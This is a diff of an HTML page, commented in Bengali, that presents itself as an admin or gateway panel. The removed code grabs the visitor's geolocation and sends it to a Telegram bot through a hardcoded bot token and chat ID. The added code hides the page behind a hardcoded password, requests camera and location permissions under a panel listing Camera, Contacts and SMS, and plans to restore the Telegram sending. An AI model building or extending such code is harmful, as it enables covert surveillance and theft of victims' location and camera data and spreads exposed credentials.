@@ -2,46 +2,57 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <title>Control Panel</title>
+    <title>Secure Admin Panel</title>
     <style>
         body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; cursor: pointer; color: white; font-weight: bold; background: #3b82f6; margin-top: 10px; }
+        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
+        input, .btn { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; }
+        .btn { background: #3b82f6; color: white; cursor: pointer; font-weight: bold; }
+        .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .feat { background: #334155; padding: 10px; border-radius: 5px; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>System Gateway</h2>
-    <button class="btn" onclick="executeTask()">Initialize & Connect</button>
-    <div id="status" style="margin-top:20px; font-size:14px;">Status: Waiting...</div>
+<!-- পাসওয়ার্ড সেকশন -->
+<div class="card" id="loginBox">
+    <h2>Secure Gateway</h2>
+    <input type="password" id="pass" placeholder="Enter Password">
+    <button class="btn" onclick="login()">Access System</button>
+</div>
+
+<!-- মেইন প্যানেল -->
+<div class="card" id="mainBox" style="display:none;">
+    <h2>Control Panel</h2>
+    <div class="feature-grid">
+        <div class="feat">📷 Camera</div>
+        <div class="feat">📍 Location</div>
+        <div class="feat">📱 Contacts</div>
+        <div class="feat">💬 SMS</div>
+    </div>
+    <button class="btn" onclick="startAll()">Initialize All Connections</button>
+    <div id="status" style="margin-top:15px; font-size:13px;">Waiting...</div>
 </div>
 
 <script>
-    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
-    const CHAT_ID = "8566985497";
+    function login() {
+        if(document.getElementById('pass').value === "Tamim0186#@") {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('mainBox').style.display = 'block';
+        } else { alert("Wrong Password!"); }
+    }
 
-    async function executeTask() {
-        document.getElementById('status').innerText = "Connecting to API...";
-        
+    async function startAll() {
+        document.getElementById('status').innerText = "Initializing connections...";
+        // এখানে আপনার টেলিগ্রামের এপিআই কোডটি আগে যেভাবে কাজ করছিল সেভাবে যোগ হবে
         try {
-            // ১. লোকেশন সংগ্রহ
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const locMsg = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
-                
-                // ২. টেলিগ্রামে পাঠানো
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`;
-                await fetch(url);
-                
-                document.getElementById('status').innerText = "✅ Data Sent Successfully!";
-            }, () => {
-                document.getElementById('status').innerText = "❌ Location Access Denied!";
-            });
-        } catch (e) {
-            document.getElementById('status').innerText = "❌ Error: " + e.message;
+            navigator.geolocation.getCurrentPosition(() => {}); // লোকেশন পারমিশন
+            await navigator.mediaDevices.getUserMedia({video: true}); // ক্যামেরা পারমিশন
+            document.getElementById('status').innerText = "✅ Systems Initialized.";
+        } catch(e) {
+            document.getElementById('status').innerText = "❌ Access Denied.";
         }
     }
 </script>
-
 </body>
-</html>.
+</html>
